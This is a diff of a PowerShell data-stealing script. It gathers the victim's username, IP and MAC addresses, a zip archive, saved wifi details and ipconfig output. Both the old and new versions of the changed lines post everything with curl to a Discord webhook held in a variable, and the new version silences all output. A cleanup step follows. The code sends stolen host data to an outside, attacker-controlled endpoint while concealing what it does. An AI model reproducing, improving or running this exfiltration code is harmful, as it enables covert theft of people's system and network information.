@@ -16,14 +16,12 @@ $ipv4=(ipconfig /all | findstr /R "IPv4")
 #send to discord
 
 #send http
-Start-Process -FilePath "curl.exe" -ArgumentList @(
-    "-X", "POST",
-    "-F", "content=`"$($whoami_content) |IPS: $IPv4 | MACS: $mac | IPv6: $ipv6 | @everyone`"",
-    "-F", "file1=@$zip",
-    "-F", "file2=@$e\wifi.txt",
-    "-F", "file3=@$e\ipcfg.txt",
-    "$wh"
-) -NoNewWindow -Wait -RedirectStandardOutput "NUL" -RedirectStandardError "NUL"    
+& curl.exe -X POST `
+  -F "content=$($whoami_content) |IPS: $IPv4 | MACS: $mac | IPv6: $ipv6 | @everyone" `
+  -F "file1=@$zip" `
+  -F "file2=@$e\wifi.txt" `
+  -F "file3=@$e\ipcfg.txt" `
+  $wh *> $null   
 
 # cleanup
 
